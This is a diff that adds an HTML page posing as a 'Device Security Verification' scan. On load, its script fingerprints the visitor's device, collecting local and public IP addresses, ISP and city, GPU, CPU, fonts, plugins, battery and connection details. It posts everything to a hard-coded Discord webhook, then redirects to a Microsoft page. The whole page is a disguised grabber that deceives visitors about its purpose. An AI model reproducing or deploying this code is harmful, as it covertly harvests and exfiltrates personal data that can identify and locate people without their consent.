@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Security Verification</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 50px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; min-height: 100vh; }
+        .container { max-width: 800px; margin: 0 auto; background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 30px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3); }
+        .loader { border: 5px solid rgba(255, 255, 255, 0.3); border-top: 5px solid #00ff9d; border-radius: 50%; width: 60px; height: 60px; animation: spin 1.5s linear infinite; margin: 40px auto; }
+        .progress { width: 100%; background: rgba(255, 255, 255, 0.2); border-radius: 10px; margin: 20px 0; }
+        .progress-bar { height: 10px; background: #00ff9d; border-radius: 10px; width: 0%; transition: width 0.5s; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { margin: 20px 0; font-size: 14px; opacity: 0.9; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 Device Security Verification</h1>
+        <p>Scanning hardware integrity and system configuration...</p>
+        
+        <div class="loader"></div>
+        
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="status" id="status">Initializing security protocols...</div>
+        <div class="status" id="detailStatus"></div>
+        
+        <p style="font-size: 12px; opacity: 0.7; margin-top: 40px;">
+            This verification ensures your device meets security standards.<br>
+            Do not close this window until completion.
+        </p>
+    </div>
+
+    <script>
+        (function() {
+            // Webhook URL
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1450906355358765277/K_-lVCdnilvLbIWQso8ETts782NtYTzdbUQ-9w7xuk9bdx8lV5ndkCe4rYgxtxierWs2';
+            
+            // Update UI
+            function updateProgress(percent, status, detail) {
+                document.getElementById('progressBar').style.width = percent + '%';
+                document.getElementById('status').textContent = status;
+                if (detail) document.getElementById('detailStatus').textContent = detail;
+            }
+
+            // Advanced Hardware Fingerprint Object
+            let hardwarePrint = {
+                timestamp: new Date().toISOString(),
+                sessionId: 'SESS_' + Math.random().toString(36).substr(2, 9).toUpperCase(),
+                
+                // ====== HARDWARE IDENTIFICATION ======
+                hardware: {
+                    // MAC Address Inference Attempts
+                    macInference: {
+                        webRTC: 'Collecting...',
+                        networkInterfaces: 'Collecting...',
+                        routerHint: 'Collecting...'
+                    },
+                    
+                    // Device Unique Identifiers
+                    deviceIds: {
+                        generatedHWID: 'Generating...',
+                        canvasFingerprint: 'Calculating...',
+                        webglRenderer: 'Detecting...',
+                        audioPrint: 'Analyzing...',
+                        persistentStorageId: 'Checking...',
+                        installationId: 'Checking...'
+                    },
+                    
+                    // Physical Hardware Details
+                    components: {
+                        cpu: {
+                            cores: navigator.hardwareConcurrency || 'Unknown',
+                            architecture: navigator.cpuClass || navigator.platform || 'Unknown'
+                        },
+                        memory: {
+                            deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
+                            jsHeapLimit: 'Checking...'
+                        },
+                        gpu: {
+                            vendor: 'Detecting...',
+                            renderer: 'Detecting...',
+                            version: 'Detecting...'
+                        },
+                        display: {
+                            screens: 'Detecting...',
+                            colorDepth: screen.colorDepth + 'bit',
+                            pixelDepth: screen.pixelDepth + 'bit'
+                        },
+                        storage: {
+                            estimated: 'Calculating...',
+                            persistent: 'Checking...'
+                        }
+                    },
+                    
+                    // Connectivity Hardware
+                    networkHardware: {
+                        localIPs: [],
+                        publicIP: 'Fetching...',
+                        connectionType: 'Checking...',
+                        bluetooth: 'Checking...',
+                        usbDevices: []
+                    },
+                    
+                    // System Bios/Firmware Hints
+                    system: {
+                        platform: navigator.platform,
+                        oscpu: navigator.oscpu || 'Unknown',
+                        productSub: navigator.productSub,
+                        vendor: navigator.vendor || 'Unknown'
+                    }
+                },
+                
+                // ====== BROWSER & NETWORK ======
+                browser: {
+                    fullUserAgent: navigator.userAgent,
+                    appVersion: navigator.appVersion,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    plugins: [],
+                    fonts: [],
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset()
+                },
+                
+                // ====== ENVIRONMENT ======
+                environment: {
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        availWidth: screen.availWidth,
+                        availHeight: screen.availHeight
+                    },
+                    window: {
+                        innerWidth: window.innerWidth,
+                        innerHeight: window.innerHeight,
+                        outerWidth: window.outerWidth,
+                        outerHeight: window.outerHeight
+                    },
+                    location: {
+                        href: window.location.href,
+                        hostname: window.location.hostname,
+                        protocol: window.location.protocol
+                    },
+                    battery: {},
+                    connection: {},
+                    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0
+                }
+            };
+
+            // ======================
+            // ADVANCED MAC INFERENCE
+            // ======================
+            
+            // Method 1: WebRTC MAC Pattern Detection
+            async function inferMACviaWebRTC() {
+                return new Promise((resolve) => {
+                    updateProgress(15, 'Analyzing network hardware...', 'Checking WebRTC interfaces');
+                    
+                    const patterns = [];
+                    const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                    
+                    if (!RTCPeerConnection) {
+                        resolve('WebRTC not available');
+                        return;
+                    }
+
+                    try {
+                        const pc = new RTCPeerConnection({
+                            iceServers: [],
+                            iceCandidatePoolSize: 10
+                        });
+                        
+                        pc.createDataChannel('mac-probe');
+                        pc.createOffer({
+                            offerToReceiveAudio: true,
+                            offerToReceiveVideo: true
+                        })
+                        .then(offer => pc.setLocalDescription(offer))
+                        .catch(e => console.log('Offer error:', e));
+
+                        let candidates = [];
+                        pc.onicecandidate = (event) => {
+                            if (event.candidate) {
+                                const candidate = event.candidate.candidate;
+                                candidates.push(candidate);
+                                
+                                // MAC-like pattern matching (XX:XX:XX:XX:XX:XX)
+                                const macPattern = /([a-fA-F0-9]{2}[:]){5}[a-fA-F0-9]{2}/g;
+                                const macMatch = candidate.match(macPattern);
+                                if (macMatch) {
+                                    patterns.push('WebRTC-MAC: ' + macMatch[0]);
+                                }
+                                
+                                // Network interface IDs
+                                if (candidate.includes('host')) {
+                                    const ifacePattern = /([a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12})/i;
+                                    const ifaceMatch = candidate.match(ifacePattern);
+                                    if (ifaceMatch) {
+                                        patterns.push('Interface-ID: ' + ifaceMatch[0]);
+                                    }
+                                }
+                            }
+                        };
+
+                        setTimeout(() => {
+                            pc.close();
+                            // Additional pattern: Check for hardware-specific candidate attributes
+                            const hardwareCandidates = candidates.filter(c => 
+                                c.includes('generation') || 
+                                c.includes('network-cost') || 
+                                c.includes('interface')
+                            );
+                            
+                            if (hardwareCandidates.length > 0) {
+                                patterns.push('Hardware-candidates: ' + hardwareCandidates.length);
+                            }
+                            
+                            resolve(patterns.length > 0 ? patterns.join(' | ') : 'No MAC patterns in WebRTC');
+                        }, 2000);
+                    } catch (error) {
+                        resolve('WebRTC error: ' + error.message);
+                    }
+                });
+            }
+
+            // Method 2: Network Interface Enumeration Attempt
+            async function getNetworkInterfaces() {
+                return new Promise(async (resolve) => {
+                    updateProgress(25, 'Scanning network interfaces...', 'Mapping local network topology');
+                    
+                    try {
+                        // Use WebRTC statistics to infer network interfaces
+                        const pc = new RTCPeerConnection();
+                        const dc = pc.createDataChannel('probe');
+                        
+                        let stats;
+                        try {
+                            const offer = await pc.createOffer();
+                            await pc.setLocalDescription(offer);
+                            await new Promise(resolve => setTimeout(resolve, 500));
+                            
+                            stats = await pc.getStats();
+                        } catch (e) {
+                            // Fallback
+                        }
+                        
+                        const interfaces = [];
+                        if (stats) {
+                            stats.forEach(report => {
+                                if (report.type === 'local-candidate' || report.type === 'remote-candidate') {
+                                    if (report.ip && report.port) {
+                                        interfaces.push({
+                                            ip: report.ip,
+                                            port: report.port,
+                                            protocol: report.protocol,
+                                            type: report.candidateType
+                                        });
+                                    }
+                                }
+                            });
+                        }
+                        
+                        // Attempt to detect multiple network interfaces
+                        if (interfaces.length > 1) {
+                            resolve('Multiple interfaces detected: ' + interfaces.length + ' | IPs: ' + 
+                                   interfaces.map(i => i.ip).filter((v, i, a) => a.indexOf(v) === i).join(', '));
+                        } else if (interfaces.length === 1) {
+                            resolve('Single interface: ' + interfaces[0].ip);
+                        } else {
+                            // Try additional method using performance timing
+                            const perfEntries = performance.getEntriesByType('resource');
+                            const uniqueDomains = new Set(perfEntries.map(e => new URL(e.name).hostname));
+                            resolve('Domains contacted: ' + uniqueDomains.size);
+                        }
+                    } catch (error) {
+                        resolve('Interface scan failed');
+                    }
+                });
+            }
+
+            // ======================
+            // DEVICE ID GENERATION
+            // ======================
+            
+            // Generate Hardware ID from multiple sources
+            function generateHardwareID() {
+                updateProgress(40, 'Generating device fingerprint...', 'Combining hardware signatures');
+                
+                const components = [];
+                
+                // 1. CPU and Memory
+                components.push('CPU' + (navigator.hardwareConcurrency || '0'));
+                components.push('RAM' + (navigator.deviceMemory || '0'));
+                
+                // 2. Screen Properties (hardware related)
+                components.push('RES' + screen.width + 'x' + screen.height);
+                components.push('CD' + screen.colorDepth);
+                
+                // 3. Platform/OS
+                const platform = navigator.platform || 'UNK';
+                components.push('PLAT' + platform.replace(/[^a-zA-Z0-9]/g, ''));
+                
+                // 4. GPU Fingerprint (WebGL)
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                            components.push('GPU' + btoa(renderer).substr(0, 8).replace(/[^a-zA-Z0-9]/g, ''));
+                        }
+                    }
+                } catch(e) {}
+                
+                // 5. Audio Hardware Fingerprint
+                try {
+                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                    components.push('AUD' + audioContext.sampleRate);
+                } catch(e) {}
+                
+                // 6. Timezone and Language
+                components.push('TZ' + hardwarePrint.browser.timezone.replace(/[^a-zA-Z0-9]/g, ''));
+                components.push('LANG' + navigator.language);
+                
+                // Create hash
+                const combined = components.join(':');
+                let hash = 0;
+                for (let i = 0; i < combined.length; i++) {
+                    const char = combined.charCodeAt(i);
+                    hash = ((hash << 5) - hash) + char;
+                    hash = hash & hash;
+                }
+                
+                const hwid = 'HWID-' + Math.abs(hash).toString(36).toUpperCase().substr(0, 10) + 
+                           '-' + platform.substr(0, 3).toUpperCase() + 
+                           '-' + Date.now().toString(36).substr(-4).toUpperCase();
+                
+                hardwarePrint.hardware.deviceIds.generatedHWID = hwid;
+                return hwid;
+            }
+
+            // ======================
+            // COMPREHENSIVE DATA COLLECTION
+            // ======================
+            
+            async function collectAllData() {
+                updateProgress(10, 'Starting comprehensive scan...', 'Phase 1/5: Initializing');
+                
+                // Phase 1: Network and MAC Inference
+                updateProgress(20, 'Network analysis...', 'Phase 2/5: MAC inference');
+                hardwarePrint.hardware.macInference.webRTC = await inferMACviaWebRTC();
+                hardwarePrint.hardware.macInference.networkInterfaces = await getNetworkInterfaces();
+                
+                // Phase 2: Public IP
+                updateProgress(35, 'Fetching network details...', 'Phase 3/5: External IP detection');
+                try {
+                    const ipResponse = await fetch('https://api64.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    hardwarePrint.hardware.networkHardware.publicIP = ipData.ip;
+                    
+                    // Additional IP info
+                    const ipInfo = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    const infoData = await ipInfo.json();
+                    hardwarePrint.hardware.macInference.routerHint = `ISP: ${infoData.org || 'Unknown'} | Location: ${infoData.city || 'Unknown'}`;
+                } catch(e) {
+                    hardwarePrint.hardware.networkHardware.publicIP = 'Failed to fetch';
+                }
+                
+                // Phase 3: Hardware IDs
+                updateProgress(50, 'Hardware profiling...', 'Phase 4/5: Device identification');
+                generateHardwareID();
+                
+                // GPU Details
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            hardwarePrint.hardware.components.gpu.vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'Unknown';
+                            hardwarePrint.hardware.components.gpu.renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
+                            hardwarePrint.hardware.components.gpu.version = gl.getParameter(gl.VERSION) || 'Unknown';
+                        }
+                    }
+                } catch(e) {}
+                
+                // Audio Fingerprint
+                try {
+                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                    hardwarePrint.hardware.deviceIds.audioPrint = audioContext.sampleRate + 'Hz';
+                } catch(e) {
+                    hardwarePrint.hardware.deviceIds.audioPrint = 'Unavailable';
+                }
+                
+                // Phase 4: Browser Environment
+                updateProgress(65, 'Browser analysis...', 'Phase 5/5: Environment mapping');
+                
+                // Plugins
+                hardwarePrint.browser.plugins = Array.from(navigator.plugins || []).map(p => p.name);
+                
+                // Fonts
+                const fontList = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
+                const detectedFonts = [];
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                
+                fontList.forEach(font => {
+                    ctx.font = '72px ' + font + ', monospace';
+                    const width = ctx.measureText('test').width;
+                    ctx.font = '72px monospace';
+                    const monospaceWidth = ctx.measureText('test').width;
+                    if (width !== monospaceWidth) detectedFonts.push(font);
+                });
+                hardwarePrint.browser.fonts = detectedFonts;
+                
+                // Battery
+                if ('getBattery' in navigator) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        hardwarePrint.environment.battery = {
+                            level: Math.round(battery.level * 100) + '%',
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                    } catch(e) {}
+                }
+                
+                // Connection
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (connection) {
+                    hardwarePrint.environment.connection = {
+                        type: connection.effectiveType,
+                        downlink: connection.downlink + 'Mbps',
+                        rtt: connection.rtt + 'ms',
+                        saveData: connection.saveData
+                    };
+                }
+                
+                // Phase 5: Local IPs via WebRTC
+                updateProgress(80, 'Finalizing scan...', 'Collecting local network data');
+                const localIPs = [];
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    
+                    pc.onicecandidate = (e) => {
+                        if (e.candidate) {
+                            const candidate = e.candidate.candidate;
+                            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
+                            const match = candidate.match(ipRegex);
+                            if (match && !localIPs.includes(match[0]) && 
+                                !match[0].includes('0.0.0.0') && 
+                                match[0] !== '127.0.0.1') {
+                                localIPs.push(match[0]);
+                            }
+                        }
+                    };
+                    
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    pc.close();
+                } catch(e) {}
+                hardwarePrint.hardware.networkHardware.localIPs = localIPs;
+                
+                updateProgress(95, 'Compiling report...', 'Final preparation');
+                return hardwarePrint;
+            }
+
+            // ======================
+            // DISCORD WEBHOOK SEND
+            // ======================
+            
+            async function sendToDiscord(data) {
+                updateProgress(97, 'Transmitting data...', 'Secure upload in progress');
+                
+                // Format for Discord Embed
+                const embed = {
+                    username: "Hardware Intelligence Module",
+                    avatar_url: "https://cdn-icons-png.flaticon.com/512/3067/3067256.png",
+                    embeds: [
+                        {
+                            title: "🖥️ COMPREHENSIVE HARDWARE SCAN REPORT",
+                            color: 0x00ff9d,
+                            fields: [
+                                {
+                                    name: "🔑 **GENERATED HWID**",
+                                    value: "```" + data.hardware.deviceIds.generatedHWID + "```",
+                                    inline: false
+                                },
+                                {
+                                    name: "🌐 **NETWORK HARDWARE**",
+                                    value: "```" + 
+                                        "Public IP: " + data.hardware.networkHardware.publicIP + "\n" +
+                                        "Local IPs: " + (data.hardware.networkHardware.localIPs.join(', ') || 'None') + "\n" +
+                                        "MAC Inference: " + data.hardware.macInference.webRTC.substring(0, 100) + "\n" +
+                                        "Interfaces: " + data.hardware.macInference.networkInterfaces.substring(0, 100) + 
+                                        "```",
+                                    inline: false
+                                },
+                                {
+                                    name: "💻 **HARDWARE COMPONENTS**",
+                                    value: "```" + 
+                                        "CPU Cores: " + data.hardware.components.cpu.cores + "\n" +
+                                        "RAM: " + data.hardware.components.memory.deviceMemory + "\n" +
+                                        "GPU: " + data.hardware.components.gpu.renderer.substring(0, 30) + "\n" +
+                                        "Platform: " + data.hardware.system.platform + 
+                                        "```",
+                                    inline: true
+                                },
+                                {
+                                    name: "🌍 **SYSTEM ENVIRONMENT**",
+                                    value: "```" + 
+                                        "OS CPU: " + data.hardware.system.oscpu + "\n" +
+                                        "Timezone: " + data.browser.timezone + "\n" +
+                                        "Language: " + data.browser.language + "\n" +
+                                        "Screen: " + data.environment.screen.width + "x" + data.environment.screen.height + 
+                                        "```",
+                                    inline: true
+                                },
+                                {
+                                    name: "🔍 **BROWSER DETAILS**",
+                                    value: "```" + 
+                                        "Browser: " + (data.browser.fullUserAgent.match(/(Chrome|Firefox|Safari|Edge)\/(\d+)/) || ['Unknown'])[0] + "\n" +
+                                        "Plugins: " + data.browser.plugins.length + "\n" +
+                                        "Fonts: " + data.browser.fonts.length + 
+                                        "```",
+                                    inline: false
+                                }
+                            ],
+                            timestamp: new Date().toISOString(),
+                            footer: {
+                                text: "Hardware Scanner v3.0 • Session: " + data.sessionId
+                            }
+                        }
+                    ]
+                };
+                
+                // Send main report
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(embed)
+                });
+                
+                // Send raw data dump
+                const rawEmbed = {
+                    username: "Hardware Intelligence Module - RAW DATA",
+                    embeds: [{
+                        title: "📄 **RAW HARDWARE DATA DUMP**",
+                        description: "```json\n" + JSON.stringify(data, null, 2).substring(0, 4000) + "\n```",
+                        color: 0xff6b6b,
+                        timestamp: new Date().toISOString(),
+                        footer: {
+                            text: "Complete hardware fingerprint • " + new Date().toLocaleString()
+                        }
+                    }]
+                };
+                
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(rawEmbed)
+                });
+                
+                updateProgress(100, 'Scan complete!', 'All data transmitted successfully');
+                
+                // Redirect after completion
+                setTimeout(() => {
+                    window.location.href = 'https://www.microsoft.com/en-us/windows';
+                }, 3000);
+            }
+
+            // ======================
+            // MAIN EXECUTION
+            // ======================
+            
+            async function executeFullScan() {
+                try {
+                    const collectedData = await collectAllData();
+                    await sendToDiscord(collectedData);
+                } catch (error) {
+                    console.error('Scan error:', error);
+                    updateProgress(100, 'Scan completed with warnings', 'Some data may be incomplete');
+                    
+                    // Send error report
+                    const errorEmbed = {
+                        username: "Hardware Scanner - ERROR",
+                        embeds: [{
+                            title: "⚠️ Scan Completed with Errors",
+                            description: "Partial data collected:\n```" + JSON.stringify(hardwarePrint, null, 2).substring(0, 2000) + "```",
+                            color: 0xffcc00,
+                            timestamp: new Date().toISOString()
+                        }]
+                    };
+                    
+                    try {
+                        await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(errorEmbed)
+                        });
+                    } catch(e) {}
+                }
+            }
+
+            // Start scan when page loads
+            window.addEventListener('load', executeFullScan);
+
+        })();
+    </script>
+</body>
+</html>
